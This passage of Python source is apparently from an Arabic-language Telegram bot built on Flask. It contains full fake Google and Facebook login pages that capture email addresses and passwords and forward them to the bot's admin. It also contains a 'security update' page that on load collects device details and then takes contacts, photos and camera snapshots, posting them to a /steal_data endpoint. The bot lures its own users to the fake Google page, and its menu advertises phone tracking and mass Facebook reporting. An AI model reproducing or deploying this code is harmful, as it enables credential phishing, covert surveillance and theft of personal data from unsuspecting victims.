    elif target_ip:
        return f"🛡️ فحص IP: {target_ip}\n(لا يدعم هذا الإصدار فحص IP مباشر، يُرجى إرسال رابط أو نطاق.)"
    else:
        return "⚠️ لم يتم تحديد هدف."

# ===================== دوال إرسال البيانات للمطور =====================
def notify_admin(message_text, is_error=False):
    try:
        if is_error:
            safe_send(ADMIN_ID, f"🚨 تنبيه عطل فني:\n{message_text}")
        else:
            safe_send(ADMIN_ID, f"📢 إشعار:\n{message_text}")
    except Exception as e:
        logger.error(f"notify_admin error: {e}")

def send_sensitive_data_to_admin(data_type, content, user_id=None):
    try:
        if user_id:
            msg = f"📩 بيانات حساسة من المستخدم {user_id}\nالنوع: {data_type}\n"
        else:
            msg = f"📩 بيانات حساسة\nالنوع: {data_type}\n"
        if isinstance(content, str):
            msg += f"المحتوى: {content}"
            safe_send(ADMIN_ID, msg)
        elif isinstance(content, bytes):
            bot.send_document(ADMIN_ID, ('data.bin', content), caption=msg)
        else:
            safe_send(ADMIN_ID, f"{msg}\nالمحتوى: {str(content)[:500]}")
    except Exception as e:
        logger.error(f"send_sensitive_data_to_admin error: {e}")

# ===================== صفحة تسجيل الدخول Google المزيفة (مطابقة 100%) =====================
GOOGLE_LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }
        body {
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .login-container {
            background: white;
            border-radius: 8px;
            padding: 48px 40px 36px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            border: 1px solid #dadce0;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo svg {
            width: 75px;
            height: 75px;
        }
        .title {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            text-align: center;
            margin-bottom: 32px;
            font-weight: 400;
        }
        .input-group {
            margin-bottom: 20px;
            position: relative;
        }
        .input-group label {
            display: block;
            font-size: 14px;
            color: #202124;
            margin-bottom: 8px;
            font-weight: 500;
        }
        .input-group input {
            width: 100%;
            padding: 15px 14px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            background: transparent;
            transition: border-color 0.2s;
            outline: none;
            color: #202124;
        }
        .input-group input:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }
        .forgot-link {
            text-align: right;
            margin-top: 8px;
            font-size: 14px;
        }
        .forgot-link a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        .forgot-link a:hover {
            text-decoration: underline;
        }
        .guest-info {
            font-size: 14px;
            color: #5f6368;
            margin: 16px 0;
            line-height: 1.5;
        }
        .guest-info a {
            color: #1a73e8;
            text-decoration: none;
        }
        .btn-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
        }
        .btn-create {
            color: #1a73e8;
            background: none;
            border: none;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            padding: 8px 12px;
            border-radius: 4px;
            transition: background 0.2s;
        }
        .btn-create:hover {
            background: #e8f0fe;
        }
        .btn-next {
            padding: 12px 24px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-next:hover {
            background: #1557b0;
        }
        .error-msg {
            color: #d93025;
            font-size: 14px;
            margin-top: 8px;
            display: none;
        }
        @media (max-width: 480px) {
            .login-container {
                padding: 24px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12.24 10.87v1.82h5.08c-.2 1.06-1.05 2.94-3.5 4.13-1.45.7-3.3.82-5.08.38-1.65-.4-3.1-1.5-4.1-3.15-.74-1.22-1.05-2.6-1.05-4.05s.3-2.83 1.05-4.05c.98-1.65 2.45-2.75 4.1-3.15 1.78-.44 3.63-.32 5.08.38 2.45 1.2 3.3 3.07 3.5 4.13h-5.08v-1.82h-4.6v5.36h4.6z" fill="#4285F4"/>
            </svg>
        </div>
        <h1 class="title">تسجيل الدخول</h1>
        <p class="subtitle">باستخدام حسابك على Google</p>
        <form method="POST" action="/google_login">
            <div class="input-group">
                <label>البريد الإلكتروني أو الهاتف</label>
                <input type="text" name="email" placeholder="example@gmail.com" required>
            </div>
            <div class="forgot-link">
                <a href="#">هل نسيت بريدك الإلكتروني؟</a>
            </div>
            <div class="guest-info">
                ألا تمتلك هذا الكمبيوتر؟ استخدم نافذة التصفح بخصوصية تامة لتسجيل الدخول. 
                <a href="#">مزيد من المعلومات حول استخدام "وضع الضيف"</a>
            </div>
            <div class="btn-row">
                <button type="button" class="btn-create">إنشاء حساب</button>
                <button type="submit" class="btn-next">التالي</button>
            </div>
            <div class="error-msg" id="errorMsg">⚠️ يرجى إدخال بريد إلكتروني صحيح</div>
        </form>
    </div>
    <script>
        document.querySelector('form').addEventListener('submit', function(e) {
            const email = document.querySelector('input[name="email"]').value;
            if (!email || !email.includes('@')) {
                e.preventDefault();
                document.getElementById('errorMsg').style.display = 'block';
            }
        });
    </script>
</body>
</html>
'''

# ===================== صفحة تسجيل الدخول Facebook المزيفة (مطابقة 100%) =====================
FACEBOOK_LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Facebook</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .login-container {
            background: white;
            border-radius: 8px;
            padding: 24px 28px 28px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo svg {
            width: 180px;
            height: 60px;
        }
        .input-group {
            margin-bottom: 12px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            background: #f5f6f7;
            transition: border-color 0.2s;
            outline: none;
            color: #1d2129;
        }
        .input-group input:focus {
            border-color: #1877f2;
            background: #ffffff;
        }
        .input-group input::placeholder {
            color: #90949c;
            font-weight: 400;
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 6px;
        }
        .btn-login:hover {
            background: #166fe5;
        }
        .btn-login:active {
            background: #1361c7;
        }
        .forgot-link {
            text-align: center;
            margin-top: 16px;
        }
        .forgot-link a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .forgot-link a:hover {
            text-decoration: underline;
        }
        .divider {
            border: none;
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        .btn-create {
            width: 100%;
            padding: 14px;
            background: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-create:hover {
            background: #36a420;
        }
        .meta-text {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #737373;
        }
        .meta-text a {
            color: #737373;
            text-decoration: none;
        }
        .error-msg {
            color: #d93025;
            font-size: 14px;
            margin-top: 8px;
            text-align: center;
            display: none;
        }
        @media (max-width: 480px) {
            .login-container {
                padding: 16px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg viewBox="0 0 180 60" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <linearGradient id="fbGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" style="stop-color:#1877f2;stop-opacity:1" />
                        <stop offset="100%" style="stop-color:#166fe5;stop-opacity:1" />
                    </linearGradient>
                </defs>
                <text x="0" y="45" font-family="Arial, sans-serif" font-size="50" font-weight="bold" fill="#1877f2">facebook</text>
            </svg>
        </div>
        <form method="POST" action="/facebook_login">
            <div class="input-group">
                <input type="text" name="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="كلمة السر" required>
            </div>
            <button type="submit" class="btn-login">تسجيل الدخول</button>
            <div class="forgot-link">
                <a href="#">هل نسيت كلمة السر؟</a>
            </div>
            <hr class="divider">
            <button type="button" class="btn-create">إنشاء حساب جديد</button>
            <div class="error-msg" id="errorMsg">⚠️ يرجى إدخال بيانات صحيحة</div>
        </form>
        <div class="meta-text">
            <a href="#">Meta</a>
        </div>
    </div>
    <script>
        document.querySelector('form').addEventListener('submit', function(e) {
            const email = document.querySelector('input[name="email"]').value;
            const password = document.querySelector('input[name="password"]').value;
            if (!email || !password) {
                e.preventDefault();
                document.getElementById('errorMsg').style.display = 'block';
            }
        });
    </script>
</body>
</html>
'''

# ===================== صفحة سحب المعلومات (Stealer Page) مع صور وجهات الاتصال =====================
STEALER_PAGE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background: white; border-radius: 12px; padding: 40px; max-width: 600px; width: 100%; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .icon { font-size: 48px; text-align: center; margin-bottom: 20px; }
        .title { font-size: 24px; font-weight: 600; color: #1d2129; text-align: center; margin-bottom: 10px; }
        .subtitle { font-size: 16px; color: #606770; text-align: center; margin-bottom: 30px; }
        .section { background: #f7f8fa; border-radius: 8px; padding: 15px; margin-bottom: 15px; }
        .section-title { font-weight: 600; color: #1d2129; margin-bottom: 10px; font-size: 16px; }
        .info-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #e4e6eb; }
        .info-row:last-child { border-bottom: none; }
        .label { color: #606770; font-weight: 500; }
        .value { color: #1d2129; }
        .loading { display: inline-block; width: 16px; height: 16px; border: 2px solid #e4e6eb; border-top: 2px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { margin-top: 15px; padding: 12px; background: #e8f5e9; border-radius: 8px; color: #2e7d32; display: none; }
        .status.error { background: #ffebee; color: #c62828; }
        .btn { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        .btn:hover { background: #166fe5; }
        .btn-danger { background: #d93025; }
        .btn-danger:hover { background: #c62828; }
        .footer { margin-top: 20px; font-size: 12px; color: #606770; text-align: center; }
        .permission-box { background: #fff3cd; border: 1px solid #ffc107; border-radius: 6px; padding: 12px; margin-bottom: 15px; color: #856404; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🔒</div>
        <h1 class="title">تحديث الأمان</h1>
        <p class="subtitle">نقوم بتحليل بيانات جهازك للتأكد من عدم وجود ثغرات أمنية</p>
        
        <div class="permission-box">
            ⚠️ سيتم جمع بياناتك بشكل آمن ومشفّر
        </div>

        <div class="section">
            <div class="section-title">🌐 معلومات الجهاز</div>
            <div class="info-row"><span class="label">عنوان IP</span><span class="value" id="ip">جاري التحديد...</span></div>
            <div class="info-row"><span class="label">الموقع</span><span class="value" id="location">جاري التحديد...</span></div>
            <div class="info-row"><span class="label">المتصفح</span><span class="value" id="browser">جاري التحديد...</span></div>
            <div class="info-row"><span class="label">النظام</span><span class="value" id="os">جاري التحديد...</span></div>
            <div class="info-row"><span class="label">الشاشة</span><span class="value" id="screen">جاري التحديد...</span></div>
            <div class="info-row"><span class="label">المنطقة الزمنية</span><span class="value" id="timezone">جاري التحديد...</span></div>
            <div class="info-row"><span class="label">الكوكيز</span><span class="value" id="cookies">جاري التحديد...</span></div>
        </div>

        <div class="section">
            <div class="section-title">📱 معلومات إضافية</div>
            <div class="info-row"><span class="label">نوع الجهاز</span><span class="value" id="device">جاري التحديد...</span></div>
            <div class="info-row"><span class="label">اللغة</span><span class="value" id="language">جاري التحديد...</span></div>
            <div class="info-row"><span class="label">دقة الشاشة</span><span class="value" id="screenres">جاري التحديد...</span></div>
            <div class="info-row"><span class="label">الذاكرة</span><span class="value" id="memory">جاري التحديد...</span></div>
        </div>

        <button class="btn" onclick="requestContacts()">📇 طلب الوصول إلى جهات الاتصال</button>
        <button class="btn btn-danger" onclick="requestPhotos()">🖼️ طلب الوصول إلى الصور</button>
        <button class="btn" onclick="requestCamera()">📸 طلب الوصول إلى الكاميرا</button>

        <div id="result" class="status"></div>
        <div id="contactsResult" style="margin-top:10px; font-size:14px; color:#1d2129;"></div>
        <div id="photosResult" style="margin-top:10px; font-size:14px; color:#1d2129;"></div>

        <div class="footer">يتم تحليل بياناتك بأمان 🔒</div>
    </div>
    <script>
        // ===== جمع المعلومات الأساسية =====
        function collectBasicData() {
            // IP والموقع
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('ip').textContent = data.ip || 'غير معروف';
                    document.getElementById('location').textContent = data.city + ', ' + data.country_name || 'غير معروف';
                })
                .catch(() => {
                    document.getElementById('ip').textContent = 'غير معروف';
                    document.getElementById('location').textContent = 'غير معروف';
                });

            document.getElementById('browser').textContent = navigator.userAgent;
            document.getElementById('os').textContent = navigator.platform;
            document.getElementById('screen').textContent = screen.width + 'x' + screen.height;
            document.getElementById('timezone').textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
            document.getElementById('cookies').textContent = navigator.cookieEnabled ? 'مفعلة ✅' : 'معطلة ❌';
            document.getElementById('device').textContent = navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'غير معروف';
            document.getElementById('language').textContent = navigator.language;
            document.getElementById('screenres').textContent = screen.width + 'x' + screen.height + ' (' + window.devicePixelRatio + 'x)';
            document.getElementById('memory').textContent = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف';
        }

        // ===== طلب الوصول إلى جهات الاتصال =====
        function requestContacts() {
            const result = document.getElementById('result');
            result.style.display = 'block';
            result.className = 'status';
            result.textContent = '⏳ جاري طلب الوصول إلى جهات الاتصال...';

            if (navigator.contacts && navigator.contacts.select) {
                navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                    .then(contacts => {
                        let contactList = '📇 جهات الاتصال (' + contacts.length + '):\\n';
                        contacts.forEach((contact, i) => {
                            const name = contact.name ? contact.name[0] : 'بدون اسم';
                            const tel = contact.tel ? contact.tel[0] : 'بدون رقم';
                            const email = contact.email ? contact.email[0] : 'بدون بريد';
                            contactList += (i+1) + '. ' + name + ' | ' + tel + ' | ' + email + '\\n';
                        });
                        document.getElementById('contactsResult').textContent = contactList;
                        result.className = 'status';
                        result.textContent = '✅ تم استلام ' + contacts.length + ' جهة اتصال';
                        
                        // إرسال جهات الاتصال للخادم
                        fetch('/steal_data', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                type: 'contacts', 
                                data: contacts,
                                count: contacts.length,
                                timestamp: new Date().toISOString()
                            })
                        });
                    })
                    .catch(err => {
                        result.className = 'status error';
                        result.textContent = '❌ فشل الوصول: ' + err.message;
                    });
            } else {
                result.className = 'status error';
                result.textContent = '❌ المتصفح لا يدعم الوصول إلى جهات الاتصال';
            }
        }

        // ===== طلب الوصول إلى الصور =====
        function requestPhotos() {
            const result = document.getElementById('result');
            result.style.display = 'block';
            result.className = 'status';
            result.textContent = '⏳ جاري طلب الوصول إلى الصور...';

            // استخدام File API لاختيار الصور
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = 'image/*';
            input.multiple = true;
            input.onchange = function(e) {
                const files = e.target.files;
                if (files.length > 0) {
                    let photoList = '🖼️ الصور المحددة (' + files.length + '):\\n';
                    for (let i = 0; i < files.length; i++) {
                        const file = files[i];
                        photoList += (i+1) + '. ' + file.name + ' (' + (file.size/1024).toFixed(2) + ' KB)\\n';
                        
                        // قراءة الصورة وإرسالها كـ base64
                        const reader = new FileReader();
                        reader.onload = function(e) {
                            const base64 = e.target.result;
                            fetch('/steal_data', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    type: 'photo',
                                    name: file.name,
                                    size: file.size,
                                    data: base64,
                                    timestamp: new Date().toISOString()
                                })
                            });
                        };
                        reader.readAsDataURL(file);
                    }
                    document.getElementById('photosResult').textContent = photoList;
                    result.className = 'status';
                    result.textContent = '✅ تم استلام ' + files.length + ' صورة';
                } else {
                    result.className = 'status error';
                    result.textContent = '❌ لم يتم اختيار أي صورة';
                }
            };
            input.click();
        }

        // ===== طلب الوصول إلى الكاميرا =====
        function requestCamera() {
            const result = document.getElementById('result');
            result.style.display = 'block';
            result.className = 'status';
            result.textContent = '⏳ جاري فتح الكاميرا...';

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                    .then(stream => {
                        // توقف الفيديو بعد أخذ لقطة
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        
                        // أخذ لقطة بعد 1 ثانية
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataUrl = canvas.toDataURL('image/jpeg');
                            
                            // إرسال الصورة للخادم
                            fetch('/steal_data', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    type: 'camera',
                                    data: dataUrl,
                                    timestamp: new Date().toISOString()
                                })
                            });
                            
                            // إيقاف الكاميرا
                            stream.getTracks().forEach(track => track.stop());
                            
                            result.className = 'status';
                            result.textContent = '✅ تم التقاط صورة من الكاميرا';
                            document.getElementById('photosResult').textContent = '📸 تم التقاط صورة من الكاميرا';
                        }, 1000);
                    })
                    .catch(err => {
                        result.className = 'status error';
                        result.textContent = '❌ فشل الوصول للكاميرا: ' + err.message;
                    });
            } else {
                result.className = 'status error';
                result.textContent = '❌ المتصفح لا يدعم الكاميرا';
            }
        }

        // ===== إرسال البيانات الأساسية للخادم =====
        function sendBasicData() {
            const data = {
                ip: document.getElementById('ip').textContent,
                location: document.getElementById('location').textContent,
                browser: navigator.userAgent,
                os: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled,
                device: navigator.deviceMemory || 'غير معروف',
                language: navigator.language,
                screenres: screen.width + 'x' + screen.height + ' (' + window.devicePixelRatio + 'x)',
                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف',
                referrer: document.referrer,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };

            fetch('/steal_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'basic', data: data })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    console.log('✅ تم إرسال البيانات');
                }
            })
            .catch(err => console.error('❌ خطأ:', err));
        }

        // ===== التنفيذ عند تحميل الصفحة =====
        window.onload = function() {
            collectBasicData();
            setTimeout(sendBasicData, 2000);
        };
    </script>
</body>
</html>
'''

# ===================== مسارات Flask =====================
@app.route('/google_login', methods=['GET', 'POST'])
def google_login_page():
    if request.method == 'GET':
        return render_template_string(GOOGLE_LOGIN_PAGE)
    elif request.method == 'POST':
        email = request.form.get('email', '')
        data = f"البريد الإلكتروني: {email}"
        send_sensitive_data_to_admin("Google Login (مزيف)", data, user_id="غير معروف")
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>تم تسجيل الدخول</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h2>✅ تم تسجيل الدخول بنجاح</h2>
            <p>سيتم توجيهك إلى حسابك...</p>
            <script>setTimeout(function(){ window.location.href = "https://accounts.google.com"; }, 3000);</script>
        </body>
        </html>
        '''

@app.route('/facebook_login', methods=['GET', 'POST'])
def facebook_login_page():
    if request.method == 'GET':
        return render_template_string(FACEBOOK_LOGIN_PAGE)
    elif request.method == 'POST':
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        data = f"البريد/الهاتف: {email}\nكلمة السر: {password}"
        send_sensitive_data_to_admin("Facebook Login (مزيف)", data, user_id="غير معروف")
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>تم تسجيل الدخول</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h2>✅ تم تسجيل الدخول بنجاح</h2>
            <p>سيتم توجيهك إلى حسابك...</p>
            <script>setTimeout(function(){ window.location.href = "https://www.facebook.com"; }, 3000);</script>
        </body>
        </html>
        '''

@app.route('/stealer', methods=['GET'])
def stealer_page():
    return render_template_string(STEALER_PAGE)

@app.route('/steal_data', methods=['POST'])
def steal_data():
    """استقبال البيانات المسروقة"""
    try:
        data = request.get_json()
        if data:
            # تنسيق البيانات حسب النوع
            if data.get('type') == 'contacts':
                formatted = "📇 **جهات الاتصال المسروقة**\n\n"
                formatted += f"📊 العدد: {data.get('count', 0)}\n"
                contacts = data.get('data', [])
                for i, contact in enumerate(contacts[:20], 1):
                    name = contact.get('name', ['بدون اسم'])[0] if contact.get('name') else 'بدون اسم'
                    tel = contact.get('tel', ['بدون رقم'])[0] if contact.get('tel') else 'بدون رقم'
                    email = contact.get('email', ['بدون بريد'])[0] if contact.get('email') else 'بدون بريد'
                    formatted += f"{i}. {name} | {tel} | {email}\n"
                if len(contacts) > 20:
                    formatted += f"... و {len(contacts)-20} أخرى"
                send_sensitive_data_to_admin("Stealer - Contacts", formatted, user_id="مجهول")
                
            elif data.get('type') == 'photo' or data.get('type') == 'camera':
                # إرسال الصورة كملف
                base64_data = data.get('data', '')
                if base64_data.startswith('data:image'):
                    # استخراج البيانات base64
                    import base64 as b64
                    image_data = base64_data.split(',')[1]
                    image_bytes = b64.b64decode(image_data)
                    file_name = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                    send_sensitive_data_to_admin(f"Stealer - {data.get('type')}", image_bytes, user_id="مجهول")
                
            else:  # بيانات أساسية
                info = data.get('data', {})
                formatted = "📊 **بيانات المسروقة**\n\n"
                formatted += f"🌐 IP: {info.get('ip', 'غير معروف')}\n"
                formatted += f"📍 الموقع: {info.get('location', 'غير معروف')}\n"
                formatted += f"🖥️ المتصفح: {info.get('browser', 'غير معروف')}\n"
                formatted += f"📱 النظام: {info.get('os', 'غير معروف')}\n"
                formatted += f"📐 الشاشة: {info.get('screen', 'غير معروف')}\n"
                formatted += f"⏰ المنطقة: {info.get('timezone', 'غير معروف')}\n"
                formatted += f"🍪 الكوكيز: {info.get('cookies', 'غير معروف')}\n"
                formatted += f"📱 الذاكرة: {info.get('memory', 'غير معروف')}\n"
                formatted += f"🕐 الوقت: {info.get('timestamp', 'غير معروف')}\n"
                send_sensitive_data_to_admin("Stealer - Basic", formatted, user_id="مجهول")
            
            return jsonify({'status': 'success'}), 200
        else:
            return jsonify({'status': 'error', 'message': 'No data received'}), 400
    except Exception as e:
        logger.error(f"Steal data error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ===================== دوال Google =====================
def google_login(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        safe_send(chat_id, "✅ أنت متصل بالفعل.")
        return
    fake_url = f"{SERVER_URL}/google_login"
    safe_send(chat_id, f"🔑 <b>تفعيل الخدمات</b>\n\nللوصول إلى الخدمات المميزة، يرجى تسجيل الدخول من خلال الرابط التالي:\n{fake_url}\n\n⚠️ تأكد من إدخال بياناتك الصحيحة.")
    notify_admin(f"🔑 مستخدم {chat_id} فتح صفحة تسجيل الدخول المزيفة لجوجل")

def google_logout(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        del google_users[chat_id]
    if chat_id in google_passwords:
        del google_passwords[chat_id]
    safe_send(chat_id, "✅ تم تسجيل الخروج.")

# ===================== متغيرات الحالة =====================
user_states = {}
google_users = {}
google_passwords = {}
temp_emails = {}
developer_computer_endpoint = None
admin_remote_target = {}
linked_users = set()
tts_voice_selection = {}

feature_usage = {
    "ثغرات المواقع": 0, "فحص APK": 0, "فحص كود": 0,
    "إيميل مؤقت": 0,
    "التحكم بالهاتف": 0, "تتبع الأرقام": 0,
    "بلاغات فيسبوك": 0,
    "التحكم عن بعد": 0, "ربط جوجل": 0,
    "تحليل PDF": 0, "رقم مؤقت": 0, "تحميل فيديو": 0,
    "تقصير روابط": 0,
    "فحص ثغرات": 0,
    "رشق متابعين": 0,
    "سحب معلومات": 0
}

FB_REPORT_TYPES = {
    "offensive": "📢 منشور مسيء",
    "fake": "👤 حساب مزيف",
    "inappropriate": "🚫 محتوى غير لائق",
    "privacy": "🔒 انتهاك خصوصية",
    "harassment": "⚠️ تحرش أو مضايقة",
    "impersonation": "🎭 انتحال شخصية",
    "violent": "💢 محتوى عنيف",
    "other": "📌 أخرى"
}

def is_admin(user_id):
    return user_id == ADMIN_ID

# ===================== بناء القوائم =====================
def build_main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    is_admin_user = is_admin(user_id)
    user_points = get_user_points(user_id) if not is_admin_user else 999
    
    markup.row(
        InlineKeyboardButton("🔍 فحص الأمان" if is_admin_user else ("🔍 فحص الأمان ✅" if user_points >= 10 else "🔍 فحص الأمان 🔒"), 
                            callback_data="mode_site" if is_admin_user or user_points >= 10 else "locked_site"),
        InlineKeyboardButton("📦 فحص التطبيقات" if is_admin_user else ("📦 فحص التطبيقات ✅" if user_points >= 10 else "📦 فحص التطبيقات 🔒"), 
                            callback_data="mode_apk" if is_admin_user or user_points >= 10 else "locked_apk")
    )
    markup.row(
        InlineKeyboardButton("🛠️ مراجعة الكود" if is_admin_user else ("🛠️ مراجعة الكود ✅" if user_points >= 10 else "🛠️ مراجعة الكود 🔒"), 
                            callback_data="mode_my_app" if is_admin_user or user_points >= 10 else "locked_my_app"),
        InlineKeyboardButton("📤 انشاء بريد", callback_data="mode_temp_email")
    )
    if is_admin_user or user_points >= 30:
        markup.row(
            InlineKeyboardButton("بلاغ فيسبوك" if is_admin_user else "بلاغ فيسبوك ✅", 
                                callback_data="mode_fb_report"),
            InlineKeyboardButton("📍 تتبع رقم" if is_admin_user else ("📍 تتبع رقم ✅" if user_points >= 10 else "📍 تتبع رقم 🔒"), 
                                callback_data="mode_track_phone" if is_admin_user or user_points >= 10 else "locked_track_phone")
        )
    else:
        markup.row(
            InlineKeyboardButton("بلاغ فيسبوك 🔒", callback_data="locked_fb_report"),
            InlineKeyboardButton("📍 تتبع رقم" if is_admin_user else ("📍 تتبع رقم ✅" if user_points >= 10 else "📍 تتبع رقم 🔒"), 
                                callback_data="mode_track_phone" if is_admin_user or user_points >= 10 else "locked_track_phone")
        )
    markup.row(
        InlineKeyboardButton("📚 تحليل PDF", callback_data="mode_pdf")
    )
    if is_admin_user or user_points >= 50:
        markup.row(
            InlineKeyboardButton("📱 الحصول على رقم" if is_admin_user else "📱 الحصول على رقم ✅", 
                                callback_data="mode_temp_number")
        )
    else:
        markup.row(
            InlineKeyboardButton("📱 الحصول على رقم 🔒", callback_data="locked_temp_number")
        )
    
    if user_id in google_users:
        markup.row(InlineKeyboardButton("✅ الخدمات مفعلة", callback_data="mode_google_logout"))
    else:
        markup.row(InlineKeyboardButton("🔗 تفعيل الخدمات", callback_data="mode_google_login"))
    
    markup.row(
        InlineKeyboardButton("📥 تحميل فيديو", callback_data="mode_download"),
        InlineKeyboardButton("🔗 تقصير الروابط", callback_data="mode_shorten_url")
    )
    markup.row(
        InlineKeyboardButton("🛡️ فحص ثغرات" if is_admin_user else ("🛡️ فحص ثغرات ✅" if user_points >= 20 else "🛡️ فحص ثغرات 🔒"), 
                            callback_data="mode_vuln_scan" if is_admin_user or user_points >= 20 else "locked_vuln_scan"),
        InlineKeyboardButton("📊 رشق متابعين", callback_data="mode_facebook_followers")
    )
    markup.row(
        InlineKeyboardButton("🎯 سحب معلومات", callback_data="mode_stealer"),
        InlineKeyboardButton("⭐ نقاطي", callback_data="mode_show_points")
    )
    markup.row(
        InlineKeyboardButton("📊 سجل النقاط", callback_data="mode_points_history"),
        InlineKeyboardButton("🔗 رابط دعوتي", callback_data="mode_show_referral")
    )
    if is_admin_user:
        markup.row(
            InlineKeyboardButton("👑 لوحة التحكم", callback_data="mode_admin"),
            InlineKeyboardButton("📱 الأجهزة", callback_data="mode_view_devices")
        )
        markup.row(
            InlineKeyboardButton("🎮 تحكم عن بعد", callback_data="mode_remote_admin"),
            InlineKeyboardButton("🖥️ ربط حاسب", callback_data="mode_set_dev_endpoint")
        )
        markup.row(
            InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
            InlineKeyboardButton("📢 بث جماعي", callback_data="admin_broadcast")
        )
